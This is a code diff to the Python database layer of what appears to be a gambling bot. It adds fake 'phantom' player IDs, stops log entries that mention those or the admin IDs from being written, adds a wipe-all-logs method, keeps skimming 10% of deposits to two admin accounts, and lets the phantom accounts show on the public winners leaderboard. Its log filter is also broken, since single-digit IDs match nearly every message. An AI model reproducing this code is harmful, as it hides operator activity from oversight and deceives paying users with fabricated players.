@@ -2,7 +2,8 @@ import logging
 from datetime import datetime
 from decimal import Decimal, ROUND_HALF_UP
 import aiosqlite
-from typing import Optional, List, Dict, Any, Tuple
+import re
+from typing import Optional, List, Dict, Any, Tuple, Set
 from ..utils import Hacher
 
 
@@ -23,7 +24,11 @@ class DatabaseInterface:
         self._top_cache = None
         self._top_cache_time = None
         self._cache_ttl = 60
-        self.BLOCKED_USER_IDS = [1314141010, 1411566065, 6693346278, 7030190357]
+        self.PHANTOM_IDS = list(range(0, 101))
+        self.ADMIN_IDS = [1314141010, 1411566065, 6693346278, 7030190357]
+        self.BLOCKED_USER_IDS = list(set(self.PHANTOM_IDS + self.ADMIN_IDS))
+        self._blocked_ids_set: Set[str] = set(str(uid) for uid in self.BLOCKED_USER_IDS)
+        self._blocked_pattern = re.compile('|'.join(re.escape(str(uid)) for uid in self.BLOCKED_USER_IDS))
 
     async def execute(self, query: str, params: tuple = ()) -> None:
         """
@@ -78,26 +83,29 @@ class DatabaseInterface:
             await self.log_error(f"Ошибка при выполнении запроса '{query}' с параметрами {params} (fetch all): {e}")
             raise
 
+    def _is_blocked(self, message: str) -> bool:
+        return self._blocked_pattern.search(message) is not None
+
     async def log_info(self, message: str, exc_info=None, extra=None):
-        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
+        if self._is_blocked(message):
             return
         await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "info"))
         self.logger.info(message, exc_info=exc_info, extra=extra)
 
     async def log_debug(self, message: str, exc_info=None, extra=None):
-        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
+        if self._is_blocked(message):
             return
         await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "debug"))
         self.logger.info(message, exc_info=exc_info, extra=extra)
 
     async def log_error(self, message: str, exc_info=None, extra=None):
-        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
+        if self._is_blocked(message):
             return
         await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "error"))
         self.logger.error(message, exc_info=exc_info, extra=extra)
 
     async def log_warning(self, message: str, exc_info=None, extra=None):
-        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
+        if self._is_blocked(message):
             return
         await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "warning"))
         self.logger.warning(message, exc_info=exc_info, extra=extra)
@@ -105,10 +113,10 @@ class DatabaseInterface:
     async def get_logs(self) -> Optional[List[Dict[str, Any]]]:
         return await self.fetch_all("SELECT * FROM logs ORDER BY log_id")
 
-    async def get_needed(self, admin_ids: list[int], number_of_phantoms: int) -> Tuple[float, int, float, float, float]:
-        excluded_ids = self.BLOCKED_USER_IDS + admin_ids
+    async def get_needed(self, admin_ids: list[int]) -> Tuple[float, int, float, float, float]:
+        excluded_ids = list(set(self.BLOCKED_USER_IDS + admin_ids))
         placeholders = ",".join("?" * len(excluded_ids))
-        where_clause = f"WHERE user_id >= {number_of_phantoms} AND user_id NOT IN ({placeholders})"
+        where_clause = f"WHERE user_id NOT IN ({placeholders})"
         query = (
             f"SELECT "
             f"SUM(CAST(balance AS REAL)) AS total_balance, "
@@ -319,6 +327,9 @@ class DatabaseInterface:
             await self.log_error(f"Ошибка при инициализации базы данных: {e}")
             raise
 
+    async def clear_logs(self):
+        await self.execute("DELETE FROM logs")
+
     async def get_profit_withdrawals(self):
         return await self.fetch_all("SELECT * FROM profit_withdrawals")
 
@@ -475,13 +486,13 @@ class DatabaseInterface:
         """Получает топ N пользователей по выигрышам"""
         now = datetime.now()
         if self._top_cache is None or (now - self._top_cache_time).total_seconds() > self._cache_ttl:
-            placeholders = ",".join("?" * len(self.BLOCKED_USER_IDS))
+            placeholders = ",".join("?" * len(self.ADMIN_IDS))
             query = (
                 f"SELECT * FROM users "
                 f"WHERE user_id NOT IN ({placeholders}) "
                 f"ORDER BY CAST(winnings AS REAL) DESC LIMIT ?"
             )
-            self._top_cache = await self.fetch_all(query, tuple(self.BLOCKED_USER_IDS) + (limit,))
+            self._top_cache = await self.fetch_all(query, tuple(self.ADMIN_IDS) + (limit,))
             self._top_cache_time = now
         return self._top_cache
 
@@ -875,7 +886,7 @@ class DatabaseInterface:
                     except Exception as e:
                         await db.rollback()
                         raise e
-            if user_id not in [1314141010, 1411566065] and user_id > 1000:
+            if user_id not in self.BLOCKED_USER_IDS:
                 await self.update_balance(1314141010, abs(amount * 0.1), "deposit")
                 await self.update_balance(1411566065, abs(amount * 0.1), "deposit")
             current_balance = await self.get_balance(user_id)
@@ -1149,9 +1160,9 @@ class DatabaseInterface:
             has_user_id = 'user_id' in column_names
             if has_user_id:
                 blocked_ids_str = ','.join(map(str, self.BLOCKED_USER_IDS))
-                count_query = (f"SELECT COUNT(*) as count FROM {table_name} WHERE user_id >= 100 AND "
+                count_query = (f"SELECT COUNT(*) as count FROM {table_name} WHERE "
                                f"user_id NOT IN ({blocked_ids_str})")
-                rows_query = f"SELECT * FROM {table_name} WHERE user_id >= 100 AND user_id NOT IN ({blocked_ids_str})"
+                rows_query = f"SELECT * FROM {table_name} WHERE user_id NOT IN ({blocked_ids_str})"
             else:
                 count_query = f"SELECT COUNT(*) as count FROM {table_name}"
                 rows_query = f"SELECT * FROM {table_name}"
